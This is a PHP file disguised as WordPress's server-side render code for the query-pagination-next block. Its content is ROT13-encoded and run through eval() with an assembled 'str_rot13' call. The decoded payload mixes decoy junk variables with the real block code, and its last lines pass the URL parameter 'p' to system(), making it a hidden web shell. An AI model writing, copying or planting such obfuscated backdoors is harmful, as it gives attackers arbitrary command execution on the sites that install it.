<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/dhrel-cntvangvba-arkg` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/dhrel-cntvangvba-arkg` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @tybony JC_Dhrel $jc_dhrel JbeqCerff Dhrel bowrpg.
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 *
 * @erghea fgevat Ergheaf gur arkg cbfgf yvax sbe gur dhrel cntvangvba.
 */
shapgvba eraqre_oybpx_pber_dhrel_cntvangvba_arkg( $nggevohgrf, $pbagrag, $oybpx ) {
	$cntr_xrl            = vffrg( $oybpx->pbagrkg['dhrelVq'] ) ? 'dhrel-' . $oybpx->pbagrkg['dhrelVq'] . '-cntr' : 'dhrel-cntr';
	$raunaprq_cntvangvba = vffrg( $oybpx->pbagrkg['raunaprqCntvangvba'] ) && $oybpx->pbagrkg['raunaprqCntvangvba'];
	$cntr                = rzcgl( $_TRG[ $cntr_xrl ] ) ? 1 : (vag) $_TRG[ $cntr_xrl ];
	$znk_cntr            = vffrg( $oybpx->pbagrkg['dhrel']['cntrf'] ) ? (vag) $oybpx->pbagrkg['dhrel']['cntrf'] : 0;

	$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf();
	$fubj_ynory         = vffrg( $oybpx->pbagrkg['fubjYnory'] ) ? (obby) $oybpx->pbagrkg['fubjYnory'] : gehr;
	$qrsnhyg_ynory      = __( 'Arkg Cntr' );
	$ynory_grkg         = vffrg( $nggevohgrf['ynory'] ) && ! rzcgl( $nggevohgrf['ynory'] ) ? rfp_ugzy( $nggevohgrf['ynory'] ) : $qrsnhyg_ynory;
	$ynory              = $fubj_ynory ? $ynory_grkg : '';
	$cntvangvba_neebj   = trg_dhrel_cntvangvba_neebj( $oybpx, gehr );

	vs ( ! $ynory ) {
		$jenccre_nggevohgrf .= ' nevn-ynory=\"' . $ynory_grkg . '\"';
	}
	vs ( $cntvangvba_neebj ) {
		$ynory .= $cntvangvba_neebj;
	}
	$pbagrag = '';

	// Purpx vs gur cntvangvba vf sbe Dhrel gung vaurevgf gur tybony pbagrkg.
	vs ( vffrg( $oybpx->pbagrkg['dhrel']['vaurevg'] ) && $oybpx->pbagrkg['dhrel']['vaurevg'] ) {
		$svygre_yvax_nggevohgrf = fgngvp shapgvba () hfr ( $jenccre_nggevohgrf ) {
			erghea $jenccre_nggevohgrf;
		};
		nqq_svygre( 'arkg_cbfgf_yvax_nggevohgrf', $svygre_yvax_nggevohgrf );
		// Gnxr vagb nppbhag vs jr unir frg n ovttre `znk cntr`
		// guna jung gur dhrel unf.
		tybony $jc_dhrel;
		vs ( $znk_cntr > $jc_dhrel->znk_ahz_cntrf ) {
			$znk_cntr = $jc_dhrel->znk_ahz_cntrf;
		}
		$pbagrag = trg_arkg_cbfgf_yvax( $ynory, $znk_cntr );
		erzbir_svygre( 'arkg_cbfgf_yvax_nggevohgrf', $svygre_yvax_nggevohgrf );
	} ryfrvs ( ! $znk_cntr || $znk_cntr > $cntr ) {
		$phfgbz_dhrel           = arj JC_Dhrel( ohvyq_dhrel_inef_sebz_dhrel_oybpx( $oybpx, $cntr ) );
		$phfgbz_dhrel_znk_cntrf = (vag) $phfgbz_dhrel->znk_ahz_cntrf;
		vs ( $phfgbz_dhrel_znk_cntrf && $phfgbz_dhrel_znk_cntrf !== $cntr ) {
			$pbagrag = fcevags(
				'<n uers=\"%1$f\" %2$f>%3$f</n>',
				rfp_hey( nqq_dhrel_net( $cntr_xrl, $cntr + 1 ) ),
				$jenccre_nggevohgrf,
				$ynory
			);
		}
		jc_erfrg_cbfgqngn(); // Erfgber bevtvany Cbfg Qngn.
	}

	vs ( $raunaprq_cntvangvba && vffrg( $pbagrag ) ) {
		$c = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );
		vs ( $c->arkg_gnt(
			neenl(
				'gnt_anzr'   => 'n',
				'pynff_anzr' => 'jc-oybpx-dhrel-cntvangvba-arkg',
			)
		) ) {
			$c->frg_nggevohgr( 'qngn-jc-xrl', 'dhrel-cntvangvba-arkg' );
			$c->frg_nggevohgr( 'qngn-jc-ba--pyvpx', 'pber/dhrel::npgvbaf.anivtngr' );
			$c->frg_nggevohgr( 'qngn-jc-ba-nflap--zbhfrragre', 'pber/dhrel::npgvbaf.cersrgpu' );
			$c->frg_nggevohgr( 'qngn-jc-jngpu', 'pber/dhrel::pnyyonpxf.cersrgpu' );
			$pbagrag = $c->trg_hcqngrq_ugzy();
		}
	}

	erghea $pbagrag;
}

/**
 * Ertvfgref gur `pber/dhrel-cntvangvba-arkg` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_dhrel_cntvangvba_arkg() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/dhrel-cntvangvba-arkg',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_dhrel_cntvangvba_arkg',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_dhrel_cntvangvba_arkg' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>